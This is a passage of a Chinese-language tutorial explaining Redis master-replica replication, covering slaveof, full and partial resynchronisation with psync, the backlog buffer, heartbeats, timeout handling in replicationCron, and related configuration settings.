<masterport>，则该Redis实例成为从节点。,\n,上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。,\n,2. 实例,\n,准备工作：启动两个节点,\n,方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：,\n,\n,启动后可以看到：,\n,\n,两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。,\n,建立复制,\n,此时在6380节点执行slaveof命令，使之变为从节点：,\n,\n,观察效果,\n,下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。,\n,（1）首先在从节点查询一个不存在的key：,\n,\n,（2）然后在主节点中增加这个key：,\n,\n,（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：,\n,\n,（4）然后在主节点删除这个key：,\n,\n,（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：,\n,\n,3. 断开复制,\n,通过slaveof <masterip> <masterport>命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。,\n,从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。,\n,\n,主节点打印日志如下：,\n,\n,三、主从复制的实现原理,\n,上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。,\n,主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。,\n,1. 连接建立阶段,\n,该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。,\n,步骤1：保存主节点信息,\n,从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。,\n,需要注意的是，,slaveof,是异步命令，从节点完成主节点ip,和port,的保存后，向发送slaveof,命令的客户端直接返回OK,，实际的复制操作在这之后才开始进行。,\n,这个过程中，可以看到从节点打印日志如下：,\n,\n,步骤2：建立socket连接,\n,从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：,\n,从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。,\n,主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，,并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。,\n,这个过程中，从节点打印日志如下：,\n,\n,步骤3：发送ping命令,\n,从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。,\n,从节点发送ping命令后，可能出现3种情况：,\n,（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。,\n,（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。,\n,（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。,\n,在主节点返回pong情况下，从节点打印日志如下：,\n,\n,步骤4：身份验证,\n,如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。,\n,如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。,\n,步骤5：发送从节点端口信息,\n,身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。,\n,2. 数据同步阶段,\n,主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。,\n,数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。,\n,需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。,\n,3. 命令传播阶段,\n,数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。,\n,在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。,\n,延迟与不一致,\n,需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。,\n,repl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。,\n,一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。,\n,四、【数据同步阶段】全量复制和部分复制,\n,在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。,\n,\n,全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。,\n,部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。,\n,\n,1. 全量复制,\n,Redis通过psync命令进行全量复制的过程如下：,\n,（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。,\n,（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令,\n,（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；,从节点首先清除自己的旧数据，然后载入接收的,RDB,文件,，将数据库状态更新至主节点执行bgsave时的数据库状态,\n,（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态,\n,（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态,\n,下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。,\n,主节点的打印日志如下：,\n,\n,从节点打印日志如下图所示：,\n,\n,其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。,\n,通过全量复制的过程可以看出，全量复制是非常重型的操作：,\n,（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 ,深入学习Redis（2）：持久化,\n,（2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗,\n,（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗,\n,2. 部分复制,\n,由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。,\n,部分复制的实现，依赖于三个重要的概念：,\n,（1）复制偏移量,\n,主节点和从节点分别维护一个复制偏移量（offset），代表的是,主节点向从节点传递的字节数,；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。,\n,offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。,\n,（2）复制积压缓冲区,\n,复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。,\n,在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。,\n,由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。,\n,从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：,\n,\n,如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；,\n,如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。,\n,\n,（3）服务器运行ID(runid),\n,每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：,\n,\n,主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：,\n,\n,如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；,\n,如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。,\n,\n,3. psync命令的执行,\n,在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。,\n,psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：,\n,\n,（1）首先，从节点根据当前状态，决定如何调用psync命令：,\n,\n,如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制；,\n,如果从节点之前执行了slaveof，则发送命令为psync <runid> <offset>，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。,\n,\n,（2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：,\n,\n,如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；,\n,如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；,\n,如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC <runid> <offset>，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。,\n,\n,4. 部分复制演示,\n,在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。,\n,网络中断,\n,网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。,\n,主节点日志如下：,\n,\n,从节点日志如下：,\n,\n,网络恢复,\n,网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。,\n,主节点日志如下：,\n,\n,从节点日志如下：,\n,\n,五、【命令传播阶段】心跳机制,\n,在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。,\n,1.主->从：PING,\n,每隔指定的时间，,主节点会向从节点发送,PING,命令,，这个PING命令的作用，主要是为了让从节点进行超时判断。,\n,PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。,\n,关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：,\n,\n,但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：,\n,\n,2. 从->主：REPLCONF ACK,\n,在命令传播阶段，,从节点会向主节点发送,REPLCONF ACK,命令，,频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：,\n,（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：,\n,\n,（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。,注意，,offset,和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。,\n,（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。,\n,六、应用中的问题,\n,1. 读写分离及其中的问题,\n,在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。,\n,（1）延迟与不一致问题,\n,前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。,\n,在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。,\n,（2）数据过期问题,\n,在单机版Redis中，存在两种删除策略：,\n,\n,惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。,\n,定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。,\n,\n,在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。,\n,Redis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。,\n,（3）故障切换问题,\n,在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。,\n,（4）总结,\n,在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。,\n,2. 复制超时问题,\n,主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。,\n,超时判断意义,\n,在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：,\n,（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。,\n,（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。,\n,判断机制,\n,主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：,\n,（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。,\n,（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：,\n,\n,如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；,\n,如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；,\n,如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。,\n,\n,主从节点判断连接超时的相关源代码如下：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n/* Replication cron function, called 1 time per second. */\r\nvoid replicationCron(void) {\r\n    static long long replication_cron_loops = 0;\r\n\r\n    /* Non blocking connection timeout? */\r\n    if (server.masterhost &&\r\n        (server.repl_state == REDIS_REPL_CONNECTING ||\r\n         slaveIsInHandshakeState()) &&\r\n         (time(NULL)-server.repl_transfer_lastio) > server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout connecting to the MASTER...\");\r\n        undoConnectWithMaster();\r\n    }\r\n\r\n    /* Bulk transfer I/O timeout? */\r\n    if (server.masterhost && server.repl_state == REDIS_REPL_TRANSFER &&\r\n        (time(NULL)-server.repl_transfer_lastio) > server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\");\r\n        replicationAbortSyncTransfer();\r\n    }\r\n\r\n    /* Timed out master when we are an already connected slave? */\r\n    if (server.masterhost && server.repl_state == REDIS_REPL_CONNECTED &&\r\n        (time(NULL)-server.master->lastinteraction) > server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"MASTER timeout: no data nor PING received...\");\r\n        freeClient(server.master);\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n    /* Disconnect timedout slaves. */\r\n    if (listLength(server.slaves)) {\r\n        listIter li;\r\n        listNode *ln;\r\n        listRewind(server.slaves,&li);\r\n        while((ln = listNext(&li))) {\r\n            redisClient *slave = ln->value;\r\n            if (slave->replstate != REDIS_REPL_ONLINE) continue;\r\n            if (slave->flags & REDIS_PRE_PSYNC) continue;\r\n            if ((server.unixtime - slave->repl_ack_time) > server.repl_timeout)\r\n            {\r\n                redisLog(REDIS_WARNING, \"Disconnecting timedout slave: %s\",\r\n                    replicationGetSlaveName(slave));\r\n                freeClient(slave);\r\n            }\r\n        }\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/* Replication cron function, called 1 time per second. */,void, ,replicationCron,(,void,), ,{,    ,static, ,long, ,long, ,replication_cron_loops, ,=, ,0,;, ,    ,/* Non blocking connection timeout? */,    ,if, ,(,server,.,masterhost, ,&&,        ,(,server,.,repl_state, ,==, ,REDIS_REPL_CONNECTING, ,||,         ,slaveIsInHandshakeState,(,),), ,&&,         ,(,time,(,NULL,),-,server,.,repl_transfer_lastio,), ,>, ,server,.,repl_timeout,),    ,{,        ,redisLog,(,REDIS_WARNING,,,\"Timeout connecting to the MASTER...\",),;,        ,undoConnectWithMaster,(,),;,    ,}, ,    ,/* Bulk transfer I/O timeout? */,    ,if, ,(,server,.,masterhost, ,&&, ,server,.,repl_state, ,==, ,REDIS_REPL_TRANSFER, ,&&,        ,(,time,(,NULL,),-,server,.,repl_transfer_lastio,), ,>, ,server,.,repl_timeout,),    ,{,        ,redisLog,(,REDIS_WARNING,,,\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\",),;,        ,replicationAbortSyncTransfer,(,),;,    ,}, ,    ,/* Timed out master when we are an already connected slave? */,    ,if, ,(,server,.,masterhost, ,&&, ,server,.,repl_state, ,==, ,REDIS_REPL_CONNECTED, ,&&,        ,(,time,(,NULL,),-,server,.,master,->,lastinteraction,), ,>, ,server,.,repl_timeout,),    ,{,        ,redisLog,(,REDIS_WARNING,,,\"MASTER timeout: no data nor PING received...\",),;,        ,freeClient,(,server,.,master,),;,    ,}, ,    ,//此处省略无关代码……, ,    ,/* Disconnect timedout slaves. */,    ,if, ,(,listLength,(,server,.,slaves,),), ,{,        ,listIter ,li,;,        ,listNode *,ln,;,        ,listRewind,(,server,.,slaves,,,&,li,),;,        ,while,(,(,ln, ,=, ,listNext,(,&,li,),),), ,{,            ,redisClient *,slave, ,=, ,ln,->,value,;,            ,if, ,(,slave,->,replstate, ,!=, ,REDIS_REPL_ONLINE,), ,continue,;,            ,if, ,(,slave,->,flags, ,&, ,REDIS_PRE_PSYNC,), ,continue,;,            ,if, ,(,(,server,.,unixtime, ,-, ,slave,->,repl_ack_time,), ,>, ,server,.,repl_timeout,),            ,{,                ,redisLog,(,REDIS_WARNING,,, ,\"Disconnecting timedout slave: %s\",,,                    ,replicationGetSlaveName,(,slave,),),;,                ,freeClient,(,slave,),;,            ,},        ,},    ,}, ,    ,//此处省略无关代码……, ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,需要注意的坑,\n,下面介绍与复制阶段连接超时有关的一些实际问题：,\n,（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。,\n,（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。,\n,（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。,\n,3. 复制中断问题,\n,主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。,\n,复制缓冲区溢出,\n,前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制->复制缓冲区溢出导致连接中断->重连->全量复制->复制缓冲区溢出导致连接中断……的循环。,\n,复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。,\n,当复制缓冲区溢出时，主节点打印日志如下所示：,\n,\n,需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。,\n,4. 各场景下复制的选择及优化技巧,\n,在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。,\n,（1）第一次建立复制,\n,此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。,\n,（2）主节点重启,\n,主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。,\n,主节点宕机,\n,主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。,\n,实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。,\n,安全重启：debug reload,\n,在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。,\n,为了解决这个问题，Redis提供了debug reload的重启方式：,重启后，主节点的,runid,和offset,都不受影响，,避免了全量复制。,\n,如下图所示，debug reload重启后runid和offset都未受影响：,\n,\n,但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。,\n,（3）从节点重启,\n,从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。,\n,（4）网络中断,\n,如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。,\n,第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF ACK来补充丢失的数据即可。,\n,第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。,\n,第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。,\n,5. 复制相关的配置,\n,这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。,\n,配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。,\n,（1）与主从节点都有关的配置,\n,首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：,\n,1)   slaveof <masterip> <masterport>：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。,\n,2)   repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。,\n,（2）主节点相关配置,\n,1)   repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。,\n,2)   repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。,\n,3)   